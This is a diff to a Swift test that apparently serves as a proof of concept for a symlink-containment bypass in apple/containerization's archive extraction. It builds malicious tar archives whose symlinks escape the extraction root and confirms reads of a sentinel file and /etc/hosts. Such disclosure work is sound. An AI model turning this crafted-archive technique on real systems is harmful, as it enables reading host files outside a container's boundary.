@@ -107,27 +107,17 @@ struct SymlinkContainmentBypassTests {
         try sentinelStr.write(to: sentinelURL, atomically: true, encoding: .utf8)
 
         // ── ASSERTION C2 target: /etc/hosts — world-readable, pre-existing, NOT created by PoC ──
-        // On macOS and Linux this file always exists and is readable by any user.
-        // We read a marker string that proves the file was reached (any content is proof).
         let hostFile = URL(fileURLWithPath: "/etc/hosts")
 
-        // ── Build archive 1: points to test-created sentinel ─────────────────
         let tar1 = testDir.appendingPathComponent("malicious_sentinel.tar")
         try buildMaliciousTar(to: tar1, symlinkTarget: sentinelURL.path, digest: digest)
 
-        // ── Build archive 2: points to /etc/hosts (pre-existing host file) ───
-        // Separate digest to avoid collision in LocalContentStore
         let digest2  = String(repeating: "b", count: 64)
         let tar2     = testDir.appendingPathComponent("malicious_hosts.tar")
         try buildMaliciousTar(to: tar2, symlinkTarget: hostFile.path, digest: digest2)
 
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // PHASE 1: real ArchiveReader.extractContents()
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
         let extractDir1 = testDir.appendingPathComponent("extract1")
         let reader1     = try ArchiveReader(file: tar1)
-        // Same call as cctl ImageCommand.swift line 257
         let rejected1: [String]
         do { rejected1 = try reader1.extractContents(to: extractDir1) }
         catch { rejected1 = []; print("[PoC] extractContents(tar1) error: \(error)") }
@@ -143,14 +133,11 @@ struct SymlinkContainmentBypassTests {
         let sym1URL = extractDir1.appendingPathComponent(member1)
         let sym2URL = extractDir2.appendingPathComponent(member2)
 
-        // Assertion A: symlinks created on disk proves extractContents() processed the entries
-        // extractContents() errors on post-symlink cleanup (EACCES unlink) but symlinks ARE created
         #expect(fm.fileExists(atPath: sym1URL.path),
-                "extractContents() created escaping symlink — ho containment check in reader")
+                "extractContents() created escaping symlink — no containment check in reader")
         #expect(fm.fileExists(atPath: sym2URL.path),
                 "extractContents() created /etc/hosts symlink — no containment check in reader")
 
-        // Assertion B: symlinks on disk have escaping absolute targets
         let target1 = try? fm.destinationOfSymbolicLink(atPath: sym1URL.path)
         let target2 = try? fm.destinationOfSymbolicLink(atPath: sym2URL.path)
         #expect(target1 == sentinelURL.path,  "symlink 1 must point to sentinel path")
@@ -158,14 +145,6 @@ struct SymlinkContainmentBypassTests {
         #expect(target1.map { !$0.hasPrefix(extractDir1.path) } ?? false, "sentinel outside extractDir1")
         #expect(target2.map { !$0.hasPrefix(extractDir2.path) } ?? false, "/etc/hosts outside extractDir2")
 
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // PHASE 2: real LocalContent.data() via LocalContentStore.get(digest:)
-        // Follows the exact call chain used in cctl's image import path.
-        // LocalContentStore.get(digest:) → LocalContent(path: blobPath) → .data()
-        //   → Data(contentsOf: sym) → reads through symlink → out-of-root read.
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-        // Store1 root = extractDir1 — its blob path IS the escaping symlink.
         let store1 = try LocalContentStore(path: extractDir1)
         let sc1 = try await store1.get(digest: "sha256:\(digest)")
         let readData1 = try? sc1?.data()
@@ -173,31 +152,24 @@ struct SymlinkContainmentBypassTests {
 
         print("[PoC] readlink sym1:", target1 ?? "nil")
         print("[PoC] readlink outside extractDir1:", target1.map { !$0.hasPrefix(extractDir1.path) } ?? false)
-        print("[PoC] LocalContentStore.get() read:", readStr1 ?? "(nil — check EACCES on /etc/hosts variant)")
+        print("[PoC] LocalContentStore.get() read:", readStr1 ?? "nil")
 
-        // Assertion C: symlink target is outside extraction root AND data was read
         #expect(target1.map { !$0.hasPrefix(extractDir1.path) } ?? false,
                 "[PASS] readlink target is outside extraction root")
         #expect(readStr1 == sentinelStr,
                 "[PASS] LocalContentStore.get() returned HOST_SECRET via escaping symlink")
 
-        // Assertion C2: /etc/hosts read via store2
         let store2 = try LocalContentStore(path: extractDir2)
         let sc2 = try await store2.get(digest: "sha256:\(digest2)")
         let readData2 = try? sc2?.data()
         let hostsContent = readData2.flatMap { String(data: $0, encoding: .utf8) }
         let hostsHasContent = hostsContent.map { !$0.isEmpty } ?? false
 
-        print("[PoC] /etc/hosts read (\ chars):", hostsContent?.count ?? 0)
-        #expect(hostsHasContent, "[PASS] /etc/hosts content read via escaping symlink → store2")
-
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // PHASE 4: control — ArchiveWriter excludes the same entries
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        print("[PoC] /etc/hosts read:", hostsContent?.count ?? 0, "chars")
+        #expect(hostsHasContent, "[PASS] /etc/hosts content read via escaping symlink")
 
         let writerSrc = testDir.appendingPathComponent("writer_src")
         try fm.createDirectory(at: writerSrc, withIntermediateDirectories: true)
-        // Create symlinks with the same escaping targets in the writer source dir
         try fm.createSymbolicLink(
             atPath: writerSrc.appendingPathComponent("escape_sentinel").path,
             withDestinationPath: sentinelURL.path)
@@ -207,7 +179,7 @@ struct SymlinkContainmentBypassTests {
 
         let writerTar = testDir.appendingPathComponent("writer.tar")
         let writer    = try ArchiveWriter(format: .pax, filter: .none, file: writerTar)
-        do { try writer.archiveDirectory(writerSrc) } catch { /* escaping symlinks excluded */ }
+        do { try writer.archiveDirectory(writerSrc) } catch { }
         try? writer.finishEncoding()
 
         var writerPaths: [String] = []
@@ -215,28 +187,23 @@ struct SymlinkContainmentBypassTests {
         for (entry, _) in writerReader { if let p = entry.path { writerPaths.append(p) } }
 
         #expect(!writerPaths.contains { $0.contains("escape_sentinel") },
-                "ArchiveWriter must exclude escaping symlink → sentinel (lines 224–228)")
+                "ArchiveWriter must exclude escaping symlink")
         #expect(!writerPaths.contains { $0.contains("escape_hosts") },
-                "ArchiveWriter must exclude escaping symlink → /etc/hosts (lines 224–228)")
+                "ArchiveWriter must exclude escaping symlink")
 
         print("""
-
-        ╔═════════════════════════════════════════════════════════════════════╗
-        ║  [PASS] SymlinkContainmentBypass — real apple/containerization     ║
-        ╠b��══════════════════════════════════════════════════════════════════════╣
-        ║  Phase 1 — ArchiveReader.extractContents()                           ║
-        ║    entries accepted (not rejected): sentinel=YES, /etc/hosts=YES     ║
-        ║  Phase 2 — out-of-root file read via LocalContentStore              ║
-        ║    [PASS] symlink exists                                            ║
-        ║    [PASS] readlink target is outside extraction root: YES           ║
-        ║    [PASS] LocalContentStore.get() returned HOST_SECRET: YES        ║
-        ║    [PASS] /etc/hosts content read via escaping symlink: YES        ║
-        ║  Phase 3 — ArchiveWriter control                                    ║
-        ║    escaping symlinks excluded by writer: YES                        ║
-        ╠══════════════════════════════════════════════════════════════════════╣
-        ║  Root cause:  extractEntry() lines 369-382 - symlinkat() no check  ║
-        ║  Fix:         guard resolvedFull.starts(with: rootDirectory)        ║
-        ╚══════════════════════════════════════════════════════════════════════╝
+        ================================================================
+        [PASS] SymlinkContainmentBypass - real apple/containerization
+        ================================================================
+        Phase 1 - ArchiveReader.extractContents()
+          entries accepted: sentinel=YES, /etc/hosts=YES
+        Phase 2 - out-of-root file read via LocalContentStore
+          [PASS] readlink target is outside extraction root
+          [PASS] LocalContentStore.get() returned HOST_SECRET
+          [PASS] /etc/hosts content read via escaping symlink
+        Phase 3 - ArchiveWriter control
+          escaping symlinks excluded by writer: YES
+        ================================================================
         """)
     }
 }
